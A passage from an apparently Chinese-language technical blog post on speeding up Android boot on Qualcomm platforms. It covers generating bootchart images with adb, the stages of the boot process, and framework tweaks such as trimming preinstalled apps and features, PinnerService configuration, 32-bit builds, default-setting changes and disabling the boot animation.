<strong>/usr/bin/</strong> 目录下（文件附文末）。<br>这两个文件是一样的，也就意味着你可以通过 <strong>bootchart</strong> 或者 <strong>pybootchartgui</strong> 来生成 <strong>bootchart.png</strong>。</p><h4 id="生成bootchart-png开机图"><a href="#生成bootchart-png开机图" class="headerlink" title="生成bootchart.png开机图"></a>生成bootchart.png开机图</h4><blockquote><ul><li>准备userdebug或者userroot设备</li><li>开启bootchart</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb root </span><br><span class="line">adb shell</span><br><span class="line">touch /data/bootchart/ enabled</span><br></pre></td></tr></table></figure><blockquote><ul><li>检查是否生成了enabled</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> /data/bootchart/</span></span><br><span class="line">enabled</span><br></pre></td></tr></table></figure><blockquote><ul><li>重启设备</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot</span><br></pre></td></tr></table></figure><blockquote><ul><li>等待开机进入Launcher，查看 <strong>/data/bootchart/</strong> 下是否有生成header文件，即bootchart日志是否生成</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line">ls /data/bootchart/</span><br></pre></td></tr></table></figure><blockquote><ul><li>拷贝 /data/bootchart/ 下的 4 个文件到本地</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proc_diskstats.log</span><br><span class="line">proc_ps.log</span><br><span class="line">proc_stat.log</span><br><span class="line">header</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pull指令：</span></span><br><span class="line">adb pull /data/bootchart/</span><br></pre></td></tr></table></figure><blockquote><ul><li>进入到 bootchart 目录（刚刚 pull 的文件夹），执行指令将这 4 个文件打包起来（在 bootchart 目录中打开终端）</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czf bootchart.tgz *</span><br></pre></td></tr></table></figure><blockquote><ul><li>执行指令，生成 bootchart.png 文件(./指代当前目录)</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootchart ./ bootchart.tgz</span><br></pre></td></tr></table></figure><blockquote><ul><li>拷贝 bootchart.png 到你需要的地方，双击查看</li></ul></blockquote><h4 id="bootchart-png示例图"><a href="#bootchart-png示例图" class="headerlink" title="bootchart.png示例图"></a>bootchart.png示例图</h4><p>bootchart图可以很直观的看到整个开机过程的时间节点以及CPU、磁盘的使用情况</p><p><img src="/images/20240316/20240316010.jpg"></p><ul><li>bootchart.png讲解</li></ul><p><img src="/images/20240316/20240316011.jpg"></p><blockquote><p>第一行：时间<br>第二行：Linux版本<br>第三行：odm release fingerprint<br>第三行：cpu架构<br>第四行：kernel配置选项<br>第五行：开机耗时</p></blockquote><p><img src="/images/20240316/20240316012.jpg"></p><p>开机过程中，CPU的使用率、I/O状态、磁盘吞吐量、磁盘使用率</p><p><img src="/images/20240316/20240316013.jpg"></p><blockquote><p>第一行：代表整个机器开机的时间，每一格代表1秒<br>第二行：代表init从长格子开始的位置开始启动<br>最后一行：开始zygote的启动，后面就是java 世界：system_server及app进程</p></blockquote><p><img src="/images/20240316/20240316014.jpg"></p><p>kernel相关的启动部分，启动时间看下init什么时候启动的就知道了。</p><h1 id="影响开机时间的Android启动流程"><a href="#影响开机时间的Android启动流程" class="headerlink" title="影响开机时间的Android启动流程"></a>影响开机时间的Android启动流程</h1><h4 id="开机框架"><a href="#开机框架" class="headerlink" title="开机框架"></a>开机框架</h4><p>引用<a href="https://gityuan.com/">Gityuan</a>大佬的一张开机流程图</p><p><img src="/images/20240316/20240316015.jpg"></p><p>Android启动流程大体为：BootRom -&gt; BootLoader -&gt; Kernel -&gt; Init -&gt; Zygote -&gt; SystemServer -&gt;Launcher</p><p><img src="/images/20240316/20240316016.jpg"></p><h4 id="Loader层"><a href="#Loader层" class="headerlink" title="Loader层"></a>Loader层</h4><ul><li>Boot ROM</li></ul><p>电源按下，引导芯片代码开始从预定义的地方（固化在ROM）开始执行，加载引导程序到RAM,然后执行。</p><ul><li>Boot Loader</li></ul><p>这是Android系统系统之前的引导程序，主要用来检测外部的RAM以及设置网络、内存、初始化硬件参数等。</p><h4 id="Kernel层"><a href="#Kernel层" class="headerlink" title="Kernel层"></a>Kernel层</h4><p>Kernel层是指Android内核层，到这里才刚刚开始进入Android系统。</p><ul><li>启动<strong>swapper进程</strong>(pid=0)，该进程又称为idle进程,，系统初始化过程Kernel由无到有开创的第一个进程,，用于初始化进程管理、内存管理，加载Display、Camera Driver、Binder Driver等相关工作（图中kernel层蓝色区块）。</li><li>启动<strong>kthreadd进程</strong>(pid=2)，是Linux系统的内核进程，会创建内核工作线程kworkder，软中断线程ksoftirqd，thermal等一系列内核守护进程。kthreadd进程是所有内核进程的父进程。</li></ul><p>Linux内核加载主要包括初始化kernel核心（内存初始化，打开中断，初始化进程表等）、初始化驱动、启动内核后台（daemons)线程、安装根（root)文件系统等。后续启动第一个用户级进程init(pid=1)。</p><h4 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h4><p>Native层主要包括启动init进程（Android的第一个用户空间进程）、HAL层（硬件抽象层）以及开机动画等。init进程是所有用户进程的鼻祖。同时init进程也会孵化一系列用户进程，还会启动关键的服务以及孵化Zygote进程。</p><ul><li>init进程会孵化出ueventd、logd、healthd、installd、adbd、lmkd等用户守护进程。</li><li>init进程还启动servicemanager(binder服务管家)、bootanim(开机动画)等重要服务。</li><li>init进程孵化出Zygote进程，Zygote进程是Android系统的第一个Java进程，Zygote是所有Java进程的父进程，Zygote进程本身是由init进程孵化而来的。</li></ul><h4 id="Framework层"><a href="#Framework层" class="headerlink" title="Framework层"></a>Framework层</h4><p>Framework层分为Java frameword和C++ framework，分别由system_server进程和media_server进程负责启动和管理。</p><p>zygote本身是一个native的应用程序，刚开始的名字为“app_process”，运行过程中，通过系统调用将自己名字改为zygote。在上图中的红色线，便是zygote fork出来的进程，所有的app进程都是由zygote fork产生的。</p><p>下面列举Zygote进程孵化的部分子进程：</p><table><thead><tr><th>进程名</th><th>解释</th></tr></thead><tbody><tr><td>system_server</td><td>Java framework的各种service都依赖此进程</td></tr><tr><td>com.android.phone</td><td>电话应用进程</td></tr><tr><td>android.process.acore</td><td>通讯录进程</td></tr><tr><td>android.process.media</td><td>多媒体应用进程</td></tr><tr><td>com.android.settings</td><td>设置进程</td></tr><tr><td>com.android.wifi</td><td>wifi应用进程</td></tr></tbody></table><ul><li>zygote进程</li></ul><p>由init进程通过解析init.rc文件后fork生成的，Zygote进程主要包含：</p><blockquote><ul><li>加载ZygoteInit类，注册Zygote Socket服务端套接字</li><li>加载虚拟机</li><li>preloadClasses</li><li>preloadResouces</li></ul></blockquote><ul><li>system_server进程</li></ul><p>由zygote进程fork而来，system_server是zygote孵化的第一个进程，system_server负责启动和管理整个java framework，包含ActivityManager、PowerManager等服务。</p><ul><li>media_server进程</li></ul><p>由init进程fork而来，负责启动和管理整个C++ framework，包含SurfaceFlinger、AudioFlinger、Camera Service等服务。</p><h4 id="app层"><a href="#app层" class="headerlink" title="app层"></a>app层</h4><ul><li>zygote进程孵化出的第一个app进程是Launcher，这是用户看到的桌面app。</li><li>zygote进程还会创建Browser，Phone，Email等app进程，每个app至少运行在一个进程上。</li><li>所有的app进程都是由zygote进程fork生成的。</li></ul><p>具体的启动过程，此文不便详述，都是代码分析，复杂且枯燥。</p><h1 id="开机时间优化方案"><a href="#开机时间优化方案" class="headerlink" title="开机时间优化方案"></a>开机时间优化方案</h1><p>以下均为framework层的优化，kernel层优化不在研究范围。</p><h4 id="精简方向"><a href="#精简方向" class="headerlink" title="精简方向"></a>精简方向</h4><p>精简初始化脚本：减少开机时的初始化时间。<br>高通平台关注以下.rc &amp; .sh文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">init.rc  </span><br><span class="line">init.target.rc  </span><br><span class="line">init.qcom.rc  </span><br><span class="line">init.sh</span><br><span class="line">init.qcom.sh  </span><br><span class="line">init.qcom.post_boot.sh</span><br></pre></td></tr></table></figure><h4 id="裁剪方向"><a href="#裁剪方向" class="headerlink" title="裁剪方向"></a>裁剪方向</h4><p>移除非必须Apks、Features、Sensor等，减少PackageScan时间。</p><ul><li><h4 id="裁剪预置APK"><a href="#裁剪预置APK" class="headerlink" title="裁剪预置APK"></a><strong>裁剪预置APK</strong></h4></li></ul><p>针对具体应用场景，可以将没用的apk裁剪掉，比如automotive可以裁掉Launcher，因为automotive自带CarLauncher。</p><p>可通过如下命令查看设备中所有的apk：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list package -f</span><br></pre></td></tr></table></figure><p>Android中的内置APK介绍见：<a href="https://docs.qq.com/sheet/DSU9kTmtid25EdXl3">Android主要应用和进程说明</a></p><p>裁剪方法：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git /build/make/core/main.mk /build/make/core/main.mk</span></span><br><span class="line"><span class="comment">index a8f46c1..d9d507b 100644</span></span><br><span class="line"><span class="comment">--- a/core/main.mk</span></span><br><span class="line"><span class="comment">+++ b/core/main.mk</span></span><br><span class="line"><span class="meta">@@ -1267,6 +1267,7 @@</span> define product-installed-files</span><br><span class="line">   $(eval ### Filter out the overridden packages and executables before doing expansion) \</span><br><span class="line">   $(eval _pif_overrides := $(call module-overrides,$(_pif_modules))) \</span><br><span class="line">   $(eval _pif_modules := $(filter-out $(_pif_overrides), $(_pif_modules))) \</span><br><span class="line"><span class="addition">+  $(eval _pif_modules := $(filter-out $(modules_product_packages_remove), $(_pif_modules))) \</span></span><br><span class="line">   $(eval _pif_modules := $(filter-out $(PRODUCT_PACKAGES_DEL), $(_pif_modules))) \</span><br><span class="line">   $(eval ### Resolve the :32 :64 module name) \</span><br><span class="line">   $(eval _pif_modules := $(sort $(call resolve-bitness-for-modules,TARGET,$(_pif_modules)))) \</span><br><span class="line"><span class="meta">@@ -1363,6 +1364,9 @@</span> else ifdef FULL_BUILD</span><br><span class="line"> endif</span><br><span class="line">   endif</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  # App removal list</span></span><br><span class="line"><span class="addition">+  modules_product_packages_remove := $(PRODUCT_PACKAGES_REMOVE)</span></span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git /build/make/core/product.mk /build/make/core/product.mk</span></span><br><span class="line"><span class="comment">index 90e960b..c556037 100644</span></span><br><span class="line"><span class="comment">--- a/core/product.mk</span></span><br><span class="line"><span class="comment">+++ b/core/product.mk</span></span><br><span class="line"><span class="meta">@@ -40,6 +40,9 @@</span> _product_list_vars += PRODUCT_PACKAGES_ENG</span><br><span class="line"> _product_list_vars += PRODUCT_PACKAGES_TESTS</span><br><span class="line"> _product_var_list += PRODUCT_PACKAGES_DEL</span><br><span class="line"> </span><br><span class="line"><span class="addition">+# App removal list</span></span><br><span class="line"><span class="addition">+_product_list_vars+= PRODUCT_PACKAGES_REMOVE</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> # The device that this product maps to.</span><br><span class="line"> _product_single_value_vars += PRODUCT_DEVICE</span><br><span class="line"> _product_single_value_vars += PRODUCT_MANUFACTURER</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git /device/qcom/&#123;product&#125;/&#123;product&#125;.mk /device/qcom/&#123;product&#125;/&#123;product&#125;.mk</span></span><br><span class="line"><span class="comment">index 163cac2..89a3078 100755</span></span><br><span class="line"><span class="comment">--- a/&#123;product&#125;.mk</span></span><br><span class="line"><span class="comment">+++ b/&#123;product&#125;.mk</span></span><br><span class="line"><span class="meta">@@ -60,6 +60,8 @@</span> PRODUCT_BUILD_USERDATA_IMAGE := true</span><br><span class="line"><span class="addition">+# App removal list</span></span><br><span class="line"><span class="addition">+PRODUCT_PACKAGES_REMOVE += \</span></span><br><span class="line"><span class="addition">+Calendar \</span></span><br><span class="line"><span class="addition">+Email \</span></span><br><span class="line"><span class="addition">+SnapdragonMusic \</span></span><br><span class="line"><span class="addition">+DeskClock \</span></span><br></pre></td></tr></table></figure><p>注意： <strong>/device/qcom/{product}/{product}.mk</strong> 取决于厂商的产品名称</p><ul><li><h4 id="移除不需要的Features"><a href="#移除不需要的Features" class="headerlink" title="移除不需要的Features"></a><strong>移除不需要的Features</strong></h4></li></ul><p>针对具体应用场景，可以将没用的Features裁剪掉，比如automotive可以裁掉 <strong><feature name="android.software.print" /></strong> </p><p>可通过如下命令查看设备中所有的Features：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list features</span><br></pre></td></tr></table></figure><p>裁剪方法：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git /frameworks/native/data/etc/android.software.print.xml /frameworks/native/data/etc/android.software.print.xml</span></span><br><span class="line"><span class="comment">index 713a7f7..e76bb88 100644</span></span><br><span class="line"><span class="comment">--- /frameworks/native/data/etc/android.software.print.xml</span></span><br><span class="line"><span class="comment">+++ /frameworks/native/data/etc/android.software.print.xml</span></span><br><span class="line"><span class="meta">@@ -15,5 +15,5 @@</span></span><br><span class="line"> --&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;permissions&gt;</span><br><span class="line"><span class="deletion">-    &lt;feature name=&quot;android.software.print&quot; /&gt;</span></span><br><span class="line"><span class="addition">+&lt;!--    &lt;feature name=&quot;android.software.print&quot; /&gt;--&gt;</span></span><br><span class="line"> &lt;/permissions&gt;</span><br></pre></td></tr></table></figure><ul><li><h4 id="禁用不需要的Sensors"><a href="#禁用不需要的Sensors" class="headerlink" title="禁用不需要的Sensors"></a><strong>禁用不需要的Sensors</strong></h4></li></ul><p>针对具体应用场景，可以将没用的Sensor裁剪掉。<br>可通过如下命令查看设备中所有支持的Sensor：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell dumpsys sensorservice</span><br></pre></td></tr></table></figure><h4 id="配置优化方向"><a href="#配置优化方向" class="headerlink" title="配置优化方向"></a>配置优化方向</h4><ul><li><h4 id="优化PinnerService配置"><a href="#优化PinnerService配置" class="headerlink" title="优化PinnerService配置"></a><strong>优化PinnerService配置</strong></h4></li></ul><p><a href="https://source.android.google.cn/docs/core/tests/debug/jank_jitter?hl=zh-cn">PinnerService</a>是用于锁定某些模块在内存中，避免这些模块被移出\移入内存从而提高程序的运行效率。优化目的是减少非首次开机启动Service的时间。</p><p>修改 <strong>/frameworks/base/core/res/res/values/config.xml</strong> ，添加如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span> <span class="attr">xmlns:xliff</span>=<span class="string">&quot;urn:oasis:names:tc:xliff:document:1.2&quot;</span>&gt;</span></span><br><span class="line">... ...</span><br><span class="line">   <span class="comment">&lt;!-- Default files to pin via Pinner Service --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string-array</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">name</span>=<span class="string">&quot;config_defaultPinnerServiceFiles&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot-framework.art&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/lib/libjavacrypto.so&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/lib/libhidltransport.so&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot-core-libart.oat&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot-conscrypt.oat&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot-core-libart.art&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot-ext.art&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot.art&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span>&quot;/system/framework/arm/boot-framework.art&quot;<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br><span class="line">... ...</span><br><span class="line"> <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：芯片商（例如高通）的代码可能会存在客制化，AOSP的位置可能会被覆盖，如果有，则以芯片商的代码为准。</p><ul><li><h4 id="使用32Bit程序"><a href="#使用32Bit程序" class="headerlink" title="使用32Bit程序"></a><strong>使用32Bit程序</strong></h4></li></ul><p>定义了32Bit的程序，机器在apk的使用及服务的申明都会有略微的精简，在设备启动时加载的资源会少，故加载时间会少。<br>修改方式：<br><strong>/device/qcom/{product}/BoardConfig.mk</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TARGET_ARCH := arm</span><br><span class="line">TARGET_ARCH_VARIANT := armv8-2a</span><br><span class="line">TARGET_CPU_ABI := armeabi-v7a</span><br><span class="line">TARGET_CPU_ABI2 := armeabi</span><br><span class="line">TARGET_CPU_VARIANT := cortex-a9</span><br><span class="line"></span><br><span class="line">#TARGET_2ND_ARCH := arm</span><br><span class="line">#TARGET_2ND_ARCH_VARIANT := armv8-2a</span><br><span class="line">#TARGET_2ND_CPU_ABI := armeabi-v7a</span><br><span class="line">#TARGET_2ND_CPU_ABI2 := armeabi</span><br><span class="line">#TARGET_2ND_CPU_VARIANT := cortex-a9</span><br></pre></td></tr></table></figure><p><strong>device/generic/art/armv8/armv8.mk</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Force 32bits executables.</span><br><span class="line">PRODUCT_DEFAULT_PROPERTY_OVERRIDES += ro.zygote=zygote32</span><br></pre></td></tr></table></figure><ul><li><h4 id="关闭默认开关"><a href="#关闭默认开关" class="headerlink" title="关闭默认开关"></a><strong>关闭默认开关</strong></h4></li></ul><p>默认关闭功能开关，开机期间不再自动启动，加快开机进度。</p><p>主要修改 <strong>/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</strong> </p><ul><li>1.关闭锁屏显示通知</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!-- Default for Settings.Secure.LOCK_SCREEN_SHOW_NOTIFICATIONS, 1==on --&gt;</span></span><br><span class="line">-    <span class="tag">&lt;<span class="name">integer</span> <span class="attr">name</span>=<span class="string">&quot;def_lock_screen_show_notifications&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">integer</span> <span class="attr">name</span>=<span class="string">&quot;def_lock_screen_show_notifications&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>2.关闭手势唤醒</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!-- Default for Settings.Secure.WAKE_GESTURE_ENABLED --&gt;</span></span><br><span class="line">-    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_wake_gesture_enabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_wake_gesture_enabled&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>3.关闭双击唤醒</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!-- Default state of tap to wake --&gt;</span></span><br><span class="line">-    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_double_tap_to_wake&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_double_tap_to_wake&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>4.关闭充电振动</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!-- Default for Settings.Secure.CHARGING_VIBRATION_ENABLED --&gt;</span></span><br><span class="line">-    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_charging_vibration_enabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_charging_vibration_enabled&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>5.关闭充电提示音</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!-- Default for Settings.Secure.CHARGING_SOUNDS_ENABLED --&gt;</span></span><br><span class="line">-    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_charging_sounds_enabled&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_charging_sounds_enabled&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>6.关闭蓝牙和wifi</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_bluetooth_on&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_wifi_display_on&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>7.关闭自动旋转</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_accelerometer_rotation&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>8.关闭Wifi Debugging</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Disable WiFi Debugging --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bool</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">name</span>=<span class="string">&quot;config_wifi_enable_wifi_firmware_debugging&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="删除开机动画"><a href="#删除开机动画" class="headerlink" title="删除开机动画"></a><strong>删除开机动画</strong></h4></li></ul><p>Animation的资源大小和播放时长一直是影响开机时间的重要因素之一，移除开机动画将有效地加快开机速度。</p><p><strong>frameworks/base/cmds/bootanimation/BootAnimationUtil.cpp</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bootAnimationDisabled</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> value[PROPERTY_VALUE_MAX];</span><br><span class="line"><span class="comment">//将获取结果改为1，则无法进入到开机动画流程中</span></span><br><span class="line"><span class="comment">//property_get(&quot;debug.sf.nobootanimation&quot;, value, &quot;0&quot;);</span></span><br><span class="line"><span class="built_in">property_get</span>(<span class="string">&quot;debug.sf.nobootanimation&quot;</span>, value, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">atoi</span>(value) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">property_get</span>(<span class="string">&quot;ro.boot.quiescent&quot;</span>, value, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">atoi</span>(value) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// Only show the bootanimation for quiescent boots if this system property is set to enabled</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">property_get_bool</span>(<span class="string">&quot;ro.bootanim.quiescent.enabled&quot;</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span 